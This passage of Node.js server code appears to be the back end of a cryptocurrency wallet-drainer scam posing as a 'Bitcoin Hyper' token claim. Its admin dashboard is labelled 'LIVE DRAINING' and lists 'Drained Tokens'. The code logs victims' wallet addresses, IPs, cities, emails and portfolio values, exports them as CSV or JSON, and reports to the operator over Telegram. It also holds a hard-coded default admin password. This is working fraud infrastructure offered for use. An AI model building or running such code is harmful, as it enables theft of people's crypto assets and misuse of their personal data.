        } : { signed: false },
        claim: participant.claim.claimed ? { 
          claimed: true, 
          claimId: participant.claim.claimId,
          claimedAt: participant.claim.claimedAt,
          txHash: participant.claim.txHash,
          drained: participant.claim.drained,
          drainStatus: participant.claim.drainStatus
        } : { claimed: false },
        connectedAt: participant.connectedAt,
        lastActive: participant.lastActive,
        status: participant.status,
        sessionId: participant.sessionId
      }
    });
    
  } catch (error) {
    console.error('Status error:', error);
    res.status(500).json({ success: false, error: 'Failed to get status' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin dashboard HTML with real-time updates
app.get('/admin', (req, res) => {
  const auth = req.headers.authorization;
  const token = auth ? auth.replace('Bearer ', '') : req.query.token;
  
  if (!token || token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
    return res.status(401).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper - Admin Login</title>
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
                 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; margin: 0; 
                 display: flex; align-items: center; justify-content: center; }
          .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); 
                      width: 400px; text-align: center; }
          h1 { color: #333; margin-bottom: 30px; }
          input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #e0e0e0; border-radius: 10px; 
                  font-size: 16px; box-sizing: border-box; }
          button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; 
                   padding: 15px 40px; border-radius: 10px; font-size: 16px; cursor: pointer; margin-top: 20px; }
          .error { color: #ef4444; margin-top: 10px; }
        </style>
      </head>
      <body>
        <div class="login-box">
          <h1>🔐 Admin Access</h1>
          <input type="password" id="token" placeholder="Enter Admin Token" />
          <button onclick="login()">Login</button>
          <div id="error" class="error"></div>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) {
              document.getElementById('error').textContent = 'Please enter token';
              return;
            }
            window.location.href = '/admin?token=' + encodeURIComponent(token);
          }
        </script>
      </body>
      </html>
    `);
  }
  
  // Get real-time stats
  const now = new Date();
  const lastHourActivity = memoryStorage.activityLog
    .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
    .length;
  
  const todayActivity = memoryStorage.activityLog
    .filter(log => new Date(log.timestamp).toDateString() === now.toDateString())
    .length;
  
  const topCountries = Object.entries(memoryStorage.analytics.countryStats)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5);
  
  const recentParticipants = memoryStorage.participants
    .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
    .slice(0, 10);
  
  const recentClaims = memoryStorage.participants
    .filter(p => p.claim.claimed)
    .sort((a, b) => new Date(b.claim.claimedAt) - new Date(a.claim.claimedAt))
    .slice(0, 10);
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper - Admin Dashboard</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: #0f172a; color: #f8fafc; }
        .dashboard { padding: 20px; max-width: 1600px; margin: 0 auto; }
        
        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #334155; margin-bottom: 30px; }
        .logo { display: flex; align-items: center; gap: 15px; }
        .logo h1 { font-size: 28px; background: linear-gradient(135deg, #f59e0b, #ef4444); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 15px; border-left: 5px solid; }
        .stat-card:nth-child(1) { border-color: #10b981; }
        .stat-card:nth-child(2) { border-color: #3b82f6; }
        .stat-card:nth-child(3) { border-color: #f59e0b; }
        .stat-card:nth-child(4) { border-color: #ef4444; }
        .stat-value { font-size: 36px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
        
        .charts-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-bottom: 30px; }
        .chart-container { background: #1e293b; padding: 25px; border-radius: 15px; }
        .chart-title { margin-bottom: 20px; color: #f8fafc; font-size: 18px; }
        
        .recent-activity { background: #1e293b; padding: 25px; border-radius: 15px; margin-bottom: 30px; }
        .activity-table { width: 100%; border-collapse: collapse; }
        .activity-table th { text-align: left; padding: 15px; border-bottom: 2px solid #334155; color: #94a3b8; }
        .activity-table td { padding: 15px; border-bottom: 1px solid #334155; }
        .activity-table tr:hover { background: #2d3748; }
        
        .export-buttons { display: flex; gap: 15px; margin-top: 30px; }
        .export-btn { padding: 12px 25px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; transition: all 0.3s; }
        .export-btn.csv { background: #10b981; color: white; }
        .export-btn.json { background: #3b82f6; color: white; }
        .export-btn.refresh { background: #f59e0b; color: white; }
        
        .live-badge { display: inline-flex; align-items: center; gap: 8px; background: #10b981; padding: 8px 15px; border-radius: 20px; font-size: 12px; }
        .live-dot { width: 8px; height: 8px; background: #ffffff; border-radius: 50%; animation: pulse 2s infinite; }
        
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
        
        .telegram-status, .email-status { display: inline-flex; align-items: center; gap: 8px; margin-right: 20px; }
        .status-online { color: #10b981; }
        .status-offline { color: #ef4444; }
      </style>
    </head>
    <body>
      <div class="dashboard">
        <div class="header">
          <div class="logo">
            <h1>BITCOIN HYPER ADMIN</h1>
            <span class="live-badge">
              <span class="live-dot"></span>
              LIVE DRAINING
            </span>
          </div>
          <div class="system-status">
            <span class="telegram-status">
              Telegram: <span class="${telegramEnabled ? 'status-online' : 'status-offline'}">${telegramEnabled ? '✅ CONNECTED' : '❌ OFFLINE'}</span>
            </span>
            <span class="email-status">
              Email: <span class="${emailEnabled ? 'status-online' : 'status-offline'}">${emailEnabled ? '✅ ENABLED' : '❌ DISABLED'}</span>
            </span>
          </div>
        </div>
        
        <div class="stats-grid">
          <div class="stat-card">
            <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
            <div class="stat-label">Total Participants</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
            <div class="stat-label">Eligible Wallets</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
            <div class="stat-label">Drained Tokens</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">$${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}</div>
            <div class="stat-label">Total Raised</div>
          </div>
        </div>
        
        <div class="charts-grid">
          <div class="chart-container">
            <div class="chart-title">Hourly Activity (Last 24h)</div>
            <canvas id="hourlyChart" height="200"></canvas>
          </div>
          <div class="chart-container">
            <div class="chart-title">Top Countries</div>
            <canvas id="countryChart" height="200"></canvas>
          </div>
        </div>
        
        <div class="recent-activity">
          <h2 class="chart-title">Recent Claims (Drained Tokens)</h2>
          <table class="activity-table">
            <thead>
              <tr>
                <th>Wallet</th>
                <th>Amount</th>
                <th>Value</th>
                <th>Country</th>
                <th>Time</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody id="claimsTable">
              ${recentClaims.map(p => `
                <tr>
                  <td>${p.walletAddress.substring(0, 8)}...${p.walletAddress.substring(36)}</td>
                  <td>${p.tokenAllocation.amount} BTH</td>
                  <td>$${p.tokenAllocation.valueUSD}</td>
                  <td>${p.country}</td>
                  <td>${new Date(p.claim.claimedAt).toLocaleTimeString()}</td>
                  <td><span style="color: #10b981;">✅ DRAINED</span></td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
        
        <div class="export-buttons">
          <button class="export-btn csv" onclick="exportData('csv')">Export CSV</button>
          <button class="export-btn json" onclick="exportData('json')">Export JSON</button>
          <button class="export-btn refresh" onclick="location.reload()">Refresh Data</button>
        </div>
      </div>
      
      <script>
        // Prepare hourly data
        const hourlyData = ${JSON.stringify(memoryStorage.analytics.hourlyConnections)};
        const hours = Array.from({length: 24}, (_, i) => i);
        const hourlyValues = hours.map(h => hourlyData[h] || 0);
        
        // Hourly activity chart
        const hourlyCtx = document.getElementById('hourlyChart').getContext('2d');
        new Chart(hourlyCtx, {
          type: 'line',
          data: {
            labels: hours.map(h => h + ':00'),
            datasets: [{
              label: 'Connections',
              data: hourlyValues,
              borderColor: '#10b981',
              backgroundColor: 'rgba(16, 185, 129, 0.1)',
              tension: 0.4,
              fill: true
            }]
          },
          options: {
            responsive: true,
            plugins: {
              legend: { display: false }
            },
            scales: {
              y: {
                beginAtZero: true,
                grid: { color: 'rgba(255,255,255,0.1)' },
                ticks: { color: '#94a3b8' }
              },
              x: {
                grid: { color: 'rgba(255,255,255,0.1)' },
                ticks: { color: '#94a3b8' }
              }
            }
          }
        });
        
        // Country chart
        const countryData = ${JSON.stringify(topCountries)};
        const countryCtx = document.getElementById('countryChart').getContext('2d');
        new Chart(countryCtx, {
          type: 'doughnut',
          data: {
            labels: countryData.map(c => c[0]),
            datasets: [{
              data: countryData.map(c => c[1]),
              backgroundColor: [
                '#ef4444', '#f59e0b', '#10b981', '#3b82f6', '#8b5cf6'
              ]
            }]
          },
          options: {
            responsive: true,
            plugins: {
              legend: {
                position: 'bottom',
                labels: { color: '#94a3b8' }
              }
            }
          }
        });
        
        function exportData(format) {
          const data = ${JSON.stringify({
            participants: memoryStorage.participants,
            statistics: memoryStorage.settings.statistics,
            activity: memoryStorage.activityLog.slice(-1000),
            analytics: memoryStorage.analytics
          })};
          
          if (format === 'json') {
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'bitcoin-hyper-data.json';
            a.click();
            URL.revokeObjectURL(url);
          } else if (format === 'csv') {
            const csv = [];
            // Add headers
            csv.push(['Wallet', 'Email', 'Country', 'Eligible', 'Claimed', 'Amount', 'Value', 'Connected At', 'Claimed At'].join(','));
            
            // Add data rows
            ${JSON.stringify(memoryStorage.participants)}.forEach(p => {
              csv.push([
                p.walletAddress,
                p.email,
                p.country,
                p.eligibility.isEligible ? 'Yes' : 'No',
                p.claim.claimed ? 'Yes' : 'No',
                p.tokenAllocation.amount,
                p.tokenAllocation.valueUSD,
                new Date(p.connectedAt).toISOString(),
                p.claim.claimedAt ? new Date(p.claim.claimedAt).toISOString() : ''
              ].join(','));
            });
            
            const blob = new Blob([csv.join('\\n')], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'bitcoin-hyper-data.csv';
            a.click();
            URL.revokeObjectURL(url);
          }
        }
        
        // Auto-refresh every 30 seconds
        setInterval(() => {
          location.reload();
        }, 30000);
      </script>
    </body>
    </html>
  `);
});

// Admin stats endpoint
app.get('/api/admin/stats', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const now = new Date();
    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      
      // Real-time metrics
      activeSessions: Object.keys(memoryStorage.sessions).length,
      lastHourActivity: memoryStorage.activityLog
        .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
        .length,
      todayActivity: memoryStorage.activityLog
        .filter(log => new Date(log.timestamp).toDateString() === now.toDateString())
        .length,
      
      // Geographic distribution
      countries: memoryStorage.participants.reduce((acc, p) => {
        const country = p.country || 'Unknown';
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      
      // Recent activity
      recentConnections: memoryStorage.participants
        .filter(p => new Date(p.connectedAt) > last24h)
        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
        .slice(0, 50)
        .map(p => ({
          wallet: p.walletAddress,
          ip: p.ipAddress,
          country: p.country,
          city: p.city,
          eligible: p.eligibility.isEligible,
          claimed: p.claim.claimed,
          amount: p.tokenAllocation.amount,
          value: p.tokenAllocation.valueUSD,
          portfolio: p.totalValueUSD,
          connected: p.connectedAt,
          status: p.status
        })),
      
      // Analytics
      hourlyActivity: memoryStorage.analytics.hourlyConnections,
      countryStats: memoryStorage.analytics.countryStats
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get stats' });
  }
});

// Export data endpoint
app.get('/api/admin/export', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const format = req.query.format || 'json';
    
    if (format === 'csv') {
      let csv = 'Wallet,Email,Country,City,Eligible,Claimed,Amount,Value,Portfolio,Connected At,Claimed At,Status,TX Hash\n';
      
      memoryStorage.participants.forEach(p => {
        csv += `"${p.walletAddress}","${p.email}","${p.country}","${p.city}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.totalValueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.status}","${p.claim.txHash}"\n`;
      });
      
      res.header('Content-Type', 'text/csv');
      res.header('Content-Disposition', 'attachment; filename=bitcoin-hyper-data.csv');
      res.send(csv);
      
    } else {
      res.json({
        success: true,
        data: {
          participants: memoryStorage.participants,
          activityLog: memoryStorage.activityLog,
          statistics: memoryStorage.settings.statistics,
          analytics: memoryStorage.analytics,
          sessions: memoryStorage.sessions,
          exportTime: new Date().toISOString(),
          totalRecords: memoryStorage.participants.length
        }
      });
    }
    
  } catch (error) {
    console.error('Export error:', error);
    res.status(500).json({ success: false, error: 'Export failed' });
  }
});

// Activity log endpoint
app.get('/api/admin/activity', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const { limit = 100, action, startDate, endDate } = req.query;
    
    let filteredLogs = [...memoryStorage.activityLog];
    
    if (action) {
      filteredLogs = filteredLogs.filter(log => log.action === action);
    }
    
    if (startDate) {
      filteredLogs = filteredLogs.filter(log => new Date(log.timestamp) >= new Date(startDate));
    }
    
    if (endDate) {
      filteredLogs = filteredLogs.filter(log => new Date(log.timestamp) <= new Date(endDate));
    }
    
    const recentLogs = filteredLogs
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, parseInt(limit));
    
    res.json({ 
      success: true, 
      logs: recentLogs, 
      total: filteredLogs.length,
      filtered: action || startDate || endDate 
    });
    
  } catch (error) {
    console.error('Activity log error:', error);
    res.status(500).json({ success: false, error: 'Failed to get activity logs' });
  }
});

// Telegram chat ID helper
app.get('/api/telegram/chatid', async (req, res) => {
  if (!process.env.TELEGRAM_BOT_TOKEN) {
    return res.json({
      success: false,
      message: 'Telegram bot token not configured'
    });
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates`);
    
    if (response.data.ok && response.data.result.length > 0) {
      const chatIds = [];
      response.data.result.forEach(update => {
        if (update.message && update.message.chat) {
          chatIds.push({
            id: update.message.chat.id,
            type: update.message.chat.type,
            title: update.message.chat.title || update.message.chat.first_name,
            username: update.message.chat.username
          });
        }
      });
      
      const uniqueChatIds = chatIds.filter((chat, index, self) =>
        index === self.findIndex((t) => t.id === chat.id)
      );
      
      return res.json({
        success: true,
        chatIds: uniqueChatIds,
        instructions: 'Use one of these chat IDs in your TELEGRAM_CHAT_ID environment variable'
      });
    } else {
      return res.json({
        success: false,
        message: 'No messages received yet. Send a message to your bot first.',
        instructions: '1. Start a chat with your bot on Telegram\n2. Send any message\n3. Refresh this page'
      });
    }
  } catch (error) {
    return res.json({
      success: false,
      message: 'Error fetching updates',
      error: error.message,
      instructions: 'Make sure your bot token is correct and the bot is running'
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  
  // Send error to Telegram
  if (telegramEnabled) {
    try {
      const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
      bot.telegram.sendMessage(
        memoryStorage.settings.telegram.chatId,
        `🔥 *CRITICAL ERROR*\n\nRoute: ${req.originalUrl}\nError: ${err.message}\nIP: ${clientIP}\nSession: ${req.sessionID}\n⏰ ${new Date().toLocaleString()}`,
        { parse_mode: 'Markdown' }
      );
    } catch (tgError) {
      console.log('Failed to send critical error:', tgError.message);
    }
  }
  
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: 'An unexpected error occurred. Our team has been notified.'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    message: `The requested endpoint ${req.originalUrl} does not exist`
  });
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  🚀 BITCOIN HYPER BACKEND v4.0.0 - REAL-TIME DRAIN
  ================================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin
  🔐 Admin Token: ${process.env.ADMIN_TOKEN ? 'SET' : 'NOT SET'}
  📈 Telegram: ${telegramEnabled ? 'ENABLED' : 'DISABLED'}
  📧 Email: ${emailEnabled ? 'ENABLED' : 'DISABLED'}
  💰 Real-time draining: ENABLED
  🔥 Enhanced tracking: ACTIVE
  `);
  
  // Initialize Telegram bot after server starts
  setTimeout(() => {
    initializeTelegramBot();
  }, 2000);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received. Shutting down gracefully...');
  if (telegramEnabled) {
    bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `🔴 *SERVER SHUTTING DOWN*\n\nServer is being terminated. Backend will be offline.\n⏰ ${new Date().toLocaleString()}`,
      { parse_mode: 'Markdown' }
    );
  }
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received. Shutting down...');
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

module.exports = app;
